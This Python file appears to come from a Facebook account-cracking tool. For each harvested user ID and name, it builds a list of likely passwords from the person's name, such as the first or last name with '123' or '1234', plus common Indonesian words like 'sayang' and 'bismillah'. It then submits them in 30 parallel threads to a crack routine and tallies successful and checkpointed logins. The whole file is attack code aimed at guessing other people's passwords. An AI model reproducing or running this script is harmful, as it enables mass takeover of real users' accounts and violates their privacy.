from tools.bahan import *
from tools import asyncFb


# --> Setting Id
def set():
	print('─' * 50)
	print('Result %sOk%s save in data/result/%s'%(h,p,resultNameOk))
	print('Result %sCp%s save in data/result/%s'%(k,p,resultNameCp))
	print('─' * 50)
	with ThreadPoolExecutor(max_workers=30) as th:
		for x in ida:
			user_pw = []
			user_id, user_name = x.split('|')
			if len(user_name) <= 1 or len(user_name) > 20:
				user_pw.append('sayang')
				user_pw.append('bismillah')
				user_pw.append('sayangku')
				user_pw.append('katasandi')
				user_pw.append('rahasia')
			else:
				if ' ' in user_name:
					depan, belakang = user_name.split(' ')[0].lower(), user_name.split(' ')[1].lower()
					user_pw.append(user_name)
					user_pw.append(user_name.lower())
					user_pw.append(depan+'123')
					user_pw.append(depan+'1234')
					user_pw.append(belakang+'123')
					user_pw.append(belakang+'1234')
				else:
					user_pw.append(user_name)
					user_pw.append(user_name.lower())
					user_pw.append(user_name+'123')
					user_pw.append(user_name.lower()+'123')
					user_pw.append(user_name+'1234')
					user_pw.append(user_name.lower()+'1234')

			th.submit(asyncFb.crack, user_id, user_pw)

	print('\rSucces Crack %s%s%s Id, total ok = %s%s%s, cp = %s%s%s'%(u,len(ida),p,h,ok,p,k,cp,p))

